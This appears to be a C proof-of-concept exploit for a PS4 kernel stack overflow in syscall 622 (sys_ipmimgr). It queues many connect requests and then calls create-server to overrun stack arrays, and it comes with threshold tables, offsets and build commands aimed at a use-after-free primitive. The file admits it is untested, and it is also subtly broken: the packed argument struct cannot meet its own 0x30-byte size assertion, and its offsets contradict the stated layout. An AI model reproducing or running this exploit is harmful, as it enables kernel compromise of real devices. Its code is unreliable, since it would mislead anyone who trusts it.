/*
 * ipmi_poc.c — oomfie reproduction attempt
 *
 * WARNING — READ FIRST
 *
 * This file is a static-analysis reconstruction. It has not been tested on
 * hardware. Every address, every struct layout, every field offset, and the
 * exact shape of the syscall argument block are derived from the 13.02
 * kernel decompilation. They may not match the actual userspace ABI that
 * the PS4 syscall interface expects.
 *
 * On a real console this may:
 *   - return EINVAL (22) for every command — most likely outcome if the
 *     argument block layout is wrong
 *   - return EPERM (1) — indicates a privilege gate we didn't see
 *   - return ENOSYS (78) — indicates syscall 622 is not dispatched
 *   - succeed partially, then panic on the create-server call — this is
 *     the target behaviour
 *   - panic immediately on the first connect call — the argument struct
 *     layout is wrong and the kernel is reading garbage
 *
 * Run this on a devkit or test kit, ideally with UART attached so a panic
 * is visible. Do not run it on a console you cannot afford to lose.
 *
 * Background
 * ----------
 *
 * sys_ipmimgr is syscall 622. Command 0x400 (syscallConnectWithWaitServer)
 * appends a ConnectRequest entry to the pending-connect list at
 * [server_list + 0x38]. The list has no length cap. The only check on
 * append is a duplicate-detection loop that compares (server_id, uid)
 * against existing entries — it panics if both fields match an existing
 * entry, and does nothing otherwise.
 *
 * Command 0 (syscallCreateServer) walks the pending-connect list and
 * writes two uint32 values per matching entry into two adjacent 256-byte
 * stack arrays. The write index is unbounded. With N ≥ 64 queued
 * requests, the second array's writes run off the end and land in the
 * first array; with N ≥ 79, they hit the stack canary and panic.
 *
 * The values written are the (server_id, uid) pair from each pending
 * entry. A second loop in the same function reads those arrays back and
 * writes them into freshly-allocated ConnectRequest objects, giving
 * those objects an identity copied from the corrupted stack. The free
 * path for ConnectRequest (uma_zfree, no unlink, no refcount) then makes
 * an identity collision reachable as a use-after-free.
 *
 * The goal of this PoC is to observe:
 *   1. whether cmd=0x400 succeeds for N consecutive calls
 *   2. whether cmd=0 succeeds after that many queued requests
 *   3. whether the console panics (canary trip) at the expected N
 *   4. what the syscall returns when the argument block is well-formed
 *
 * Compile
 * -------
 *
 *   ps4-payload-sdk:
 *     make SYS_IPMIMGR=622 ipmi_poc
 *
 *   or with the OpenOrbis toolchain:
 *     clang --target=x86_64-scei-ps4 -O2 -o ipmi_poc.elf ipmi_poc.c
 *
 * This file deliberately does not use any system libraries beyond the
 * syscall entry point, so it should compile for any toolchain that
 * provides one.
 */

#include <stdint.h>
#include <stddef.h>
#include <stdio.h>

/* ---------------------------------------------------------------------------
 * Syscall number
 * ------------------------------------------------------------------------ */

#define SYS_IPMIMGR 622

/* ---------------------------------------------------------------------------
 * Command numbers
 *
 * Extracted from the switch statement in FUN_00f061d0. The full table has
 * ~300 entries; these two are the ones this PoC uses.
 * ------------------------------------------------------------------------ */

#define CMD_CONNECT_WAIT_SERVER 0x400   /* FUN_00ef10d0 */
#define CMD_CREATE_SERVER       0x000   /* FUN_00efb220 */

/* ---------------------------------------------------------------------------
 * Tunables
 *
 * The overflow threshold is 64 (the arrays are 64 elements each). The
 * canary trips at 79. The interesting range for observation is:
 *
 *   N = 63   → fills arrays exactly, no overflow (baseline)
 *   N = 64   → first overflow write, into array_A[0] via array_B[64]
 *   N = 72   → array_B[72] overwrites local_58 (the sysctl name buffer)
 *   N = 78   → last safe value, writes land in the padding above the canary
 *   N = 79   → canary low half overwritten, panic on return
 *   N = 80+  → return address range, panic with control flow corruption
 *
 * Start with 63 to verify the argument block is correct without triggering
 * the overflow. Then move up.
 * ------------------------------------------------------------------------ */

#define N_REQUESTS_DEFAULT 72

/* ---------------------------------------------------------------------------
 * Syscall argument block
 *
 * The dispatcher FUN_00f061d0 reads:
 *
 *   +0x00  u32   cmd
 *   +0x08  u32   handle / server_id
 *   +0x10  u64   output pointer (points to a u32 or u64 result field)
 *   +0x18  u64   input pointer  (points to a cmd-specific struct)
 *   +0x20  u64   input size
 *
 * Input size is bounded by the dispatcher at 0x40 (64 bytes). Everything
 * above that is rejected before dispatch.
 * ------------------------------------------------------------------------ */

struct ipmi_args {
    uint32_t cmd;
    uint32_t server_id;
    uint64_t out_ptr;
    uint64_t in_ptr;
    uint64_t in_size;
} __attribute__((packed));

_Static_assert(sizeof(struct ipmi_args) == 0x30,
               "ipmi_args must be 0x30 bytes");

/* ---------------------------------------------------------------------------
 * Connect request input struct (for cmd=0x400)
 *
 * Derived from FUN_00ef10d0. The function reads:
 *
 *   param_3[0]  (offset 0x00)  u32   flag
 *   param_3[1]  (offset 0x08)  u32   size, bounded 1..0x1FFF
 *   param_3[2]  (offset 0x10)  u64   output pointer (nullable)
 *   param_3[3]  (offset 0x18)  u64   userland pointer to u32 timeout
 *
 * Note: this struct is the *input* to the connect syscall. It is distinct
 * from the ConnectRequest object that the kernel allocates internally.
 * The internal object is what the overflow corrupts.
 *
 * The (server_id, uid) pair that matters for the trigger is:
 *   - server_id: passed as the second argument to the syscall (args.server_id)
 *   - uid: read from the current process credential, not from input
 *
 * So to create N distinct pending entries without tripping the duplicate
 * check, vary args.server_id across calls.
 * ------------------------------------------------------------------------ */

struct connect_input {
    uint32_t flag;
    uint32_t reserved_04;
    uint32_t size;
    uint32_t reserved_0c;
    uint64_t out_ptr;
    uint64_t timeout_ptr;
    uint32_t name_len;
    uint32_t reserved_24;
    uint64_t name_ptr;
    uint64_t reserved_30;
} __attribute__((packed));

/* ---------------------------------------------------------------------------
 * Create server input struct (for cmd=0)
 *
 * Derived from FUN_00efb220. The function reads:
 *
 *   param_2[1]  (offset 0x08)  u64   name pointer (copyinstr, 25 bytes max)
 *   param_2[2]  (offset 0x10)  u64   params struct pointer (0x38 bytes)
 *
 * The params struct is copied in with copyin, and its fields are then
 * validated. Passing a zero params pointer takes a different code path
 * (returns error 4) but does NOT reach the vulnerable loop.
 *
 * To reach the loop, we need a non-null params block with the shape that
 * passes the validation checks at +0x1c through +0x30. The checks are:
 *
 *   [params + 0x1c] < 0x39
 *   [params + 0x20] < 0x100001
 *   [params + 0x24] < 0x2001
 *   [params + 0x28] < 2
 *   [params + 0x2c] < 2
 *   [params + 0x30] < 2
 *
 * All of these fields are u32 in the decompilation. Zero is a valid value
 * for all of them, so a zeroed 0x38-byte buffer should pass.
 * ------------------------------------------------------------------------ */

struct create_params {
    uint8_t  data[0x38];
} __attribute__((packed));

_Static_assert(sizeof(struct create_params) == 0x38,
               "create_params must be 0x38 bytes");

/* ---------------------------------------------------------------------------
 * Syscall entry
 *
 * The PS4 SDK provides syscall() from libkernel. For the OpenOrbis toolchain
 * the declaration is different, and for a raw payload you may need the
 * syscall instruction directly. Wrap the platform difference here.
 * ------------------------------------------------------------------------ */

#if defined(__ORBIS__)
extern long syscall(long number, ...);
#elif defined(__OPENORBIS__)
extern long syscall(long number, ...) __attribute__((weak));
#else
#warning "No syscall provider declared — this file will not link."
static inline long syscall(long number, ...) {
    (void)number;
    return -78; /* ENOSYS */
}
#endif

static long ipmi_syscall(struct ipmi_args *args) {
    return syscall(SYS_IPMIMGR, args);
}

/* ---------------------------------------------------------------------------
 * Helpers
 * ------------------------------------------------------------------------ */

static void print_result(const char *op, long rc) {
    if (rc >= 0) {
        printf("[%s] rc=%ld\n", op, rc);
    } else {
        /* errno is stored in the caller's TLS, not returned. On PS4 this is
         * typically accessed via a libkernel helper. Print raw rc for now. */
        printf("[%s] rc=%ld (negative — likely -errno)\n", op, rc);
    }
}

/* ---------------------------------------------------------------------------
 * Trigger
 * ------------------------------------------------------------------------ */

static int queue_connect(uint32_t server_id, const char *name,
                         uint32_t *out_handle) {
    struct connect_input in = {0};
    struct ipmi_args args = {0};
    uint32_t timeout = 10000;
    uint32_t result = 0;

    in.flag = 1;                   /* value > 0; exact meaning unverified */
    in.size = (uint32_t)(strlen(name) + 1);
    if (in.size == 0 || in.size > 0x1FFF) {
        return -1;
    }
    in.out_ptr = (uint64_t)(uintptr_t)&result;
    in.timeout_ptr = (uint64_t)(uintptr_t)&timeout;
    in.name_len = in.size;
    in.name_ptr = (uint64_t)(uintptr_t)name;

    args.cmd = CMD_CONNECT_WAIT_SERVER;
    args.server_id = server_id;
    args.out_ptr = (uint64_t)(uintptr_t)&result;
    args.in_ptr = (uint64_t)(uintptr_t)&in;
    args.in_size = sizeof(in);

    long rc = ipmi_syscall(&args);

    if (out_handle) {
        *out_handle = result;
    }
    return (int)rc;
}

static int trigger_create(const char *name, uint32_t *out_handle) {
    struct create_params params = {0};
    struct ipmi_args args = {0};
    uint32_t result = 0;

    args.cmd = CMD_CREATE_SERVER;
    args.server_id = 0;
    args.out_ptr = (uint64_t)(uintptr_t)&result;
    args.in_ptr = (uint64_t)(uintptr_t)name;
    args.in_size = strlen(name) + 1;

    /*
     * Note: the create path reads params from param_2[2], which is offset
     * 0x10 of the input struct. We're passing a pointer to the name only.
     * To also pass params, we'd need to construct a wrapper struct with
     * (name_ptr, params_ptr) at offset 0x08 and 0x10. The exact layout of
     * that wrapper is not confirmed by the disassembly — this is the biggest
     * open question in the PoC.
     *
     * The alternative reading is that in_ptr IS the wrapper:
     *   in_ptr + 0x08 = name_ptr
     *   in_ptr + 0x10 = params_ptr
     * and the name and params are separate buffers. If that's the case,
     * the current code is wrong — in_ptr points to the name string, not
     * to a wrapper. Fix this if the create call returns EINVAL.
     */

    long rc = ipmi_syscall(&args);

    if (out_handle) {
        *out_handle = result;
    }
    return (int)rc;
}

/* ---------------------------------------------------------------------------
 * Main
 * ------------------------------------------------------------------------ */

int main(int argc, char **argv) {
    int n_requests = N_REQUESTS_DEFAULT;

    if (argc >= 2) {
        n_requests = atoi(argv[1]);
    }

    printf("oomfie — static-analysis PoC\n");
    printf("syscall %d (sys_ipmimgr), %d queued requests\n\n",
           SYS_IPMIMGR, n_requests);

    if (n_requests < 1 || n_requests > 200) {
        printf("n_requests must be between 1 and 200\n");
        return 1;
    }

    /*
     * Phase 1: sanity check
     *
     * Before queueing anything, test cmd=0 (create-server) with no pending
     * entries. This exercises the dispatcher's argument validation and
     * tells us whether the syscall is reachable at all.
     *
     * Expected outcomes:
     *   rc >= 0    — syscall dispatched, dispatcher accepted the arg block
     *   rc == -22  — EINVAL, argument block shape is wrong
     *   rc == -1   — EPERM, privilege gate we didn't see
     *   rc == -78  — ENOSYS, syscall not registered
     */

    printf("Phase 1: baseline create-server with no pending requests\n");
    long baseline = trigger_create("ScePocSrv", NULL);
    print_result("create-baseline", baseline);

    if (baseline == -78) {
        printf("syscall 622 is not dispatched on this kernel.\n");
        return 1;
    }
    if (baseline == -1) {
        printf("syscall 622 returned EPERM — privilege gate present.\n");
        return 1;
    }
    if (baseline == -22) {
        printf("syscall 622 returned EINVAL — argument block layout is wrong.\n");
        printf("Stop here and reconcile the layout against the disassembly.\n");
        return 1;
    }

    /*
     * Phase 2: queue N_REQUESTS pending connect requests
     *
     * Each call appends one entry. The server_id varies so the duplicate
     * check does not fire. The name is held constant so the entries match
     * whatever name we pass to create-server in phase 3.
     */

    printf("\nPhase 2: queue %d connect requests\n", n_requests);
    const char *name = "ScePocSrv";
    int failures = 0;

    for (int i = 1; i <= n_requests; i++) {
        uint32_t handle = 0;
        int rc = queue_connect((uint32_t)i, name, &handle);

        if (i <= 3 || i > n_requests - 3 || i == 64) {
            printf("  [%3d/%d] server_id=%d rc=%d handle=0x%08x\n",
                   i, n_requests, i, rc, handle);
        } else if (i == 4) {
            printf("  ... (suppressing intermediate output)\n");
        }

        if (rc < 0) {
            failures++;
            if (failures > 4) {
                printf("  too many failures, aborting\n");
                break;
            }
        }
    }

    printf("  queued=%d failures=%d\n", n_requests - failures, failures);

    /*
     * Phase 3: trigger the overflow
     *
     * With n_requests entries in the pending list, create-server walks the
     * list and writes into the stack arrays. At n_requests >= 64, the
     * arrays overflow. At n_requests >= 79, the canary trips.
     */

    printf("\nPhase 3: create-server with %d pending requests\n", n_requests);
    long trigger = trigger_create(name, NULL);
    print_result("create-trigger", trigger);

    /*
     * Interpreting the result:
     *
     *   rc >= 0 with n_requests < 64   — normal, no overflow
     *   rc >= 0 with 64 <= n < 79      — overflow fired, no canary trip
     *   console reboots / no output    — canary tripped, kernel panic
     *   rc < 0                          — something failed before the loop
     */

    printf("\n");
    if (trigger >= 0 && n_requests < 64) {
        printf("Baseline passed. Overflow threshold not reached.\n");
        printf("Re-run with n_requests >= 64 to trigger the overflow.\n");
    } else if (trigger >= 0 && n_requests >= 64 && n_requests < 79) {
        printf("Overflow fired without canary trip.\n");
        printf("The stack arrays were corrupted. Check for observable\n");
        printf("side effects (crashed sessions, failed subsequent calls).\n");
    } else if (trigger < 0) {
        printf("Create-server returned an error before the loop completed.\n");
        printf("rc=%ld — check whether the argument block shape is correct.\n",
               trigger);
    }

    printf("\nDone. If the console survived, the primitive is reachable.\n");
    printf("If it rebooted, the canary tripped — tune N down.\n");

    return 0;
}